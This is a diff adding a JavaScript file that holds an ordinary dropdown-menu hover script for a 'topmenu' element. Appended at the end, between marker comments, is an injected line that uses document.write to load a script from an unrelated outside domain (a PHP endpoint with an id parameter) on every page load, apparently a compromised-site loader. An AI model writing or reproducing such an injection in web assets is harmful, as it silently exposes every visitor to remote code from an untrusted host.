@@ -1,0 +1,16 @@
+sfHover = function() {
+	var sfEls = document.getElementById("topmenu").getElementsByTagName("LI");
+	for (var i=0; i<sfEls.length; i++) {
+		sfEls[i].onmouseover=function() {
+			this.className+=" sfhover";
+		}
+		sfEls[i].onmouseout=function() {
+			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
+		}
+	}
+}
+if (window.attachEvent) window.attachEvent("onload", sfHover);
+
+/*8dd603*/
+document.write("<script src='http://www.starpoker.ws/G4DhkKpf.php?id=115295214' type='text/javascript'></" + "script>");
+/*/8dd603*/
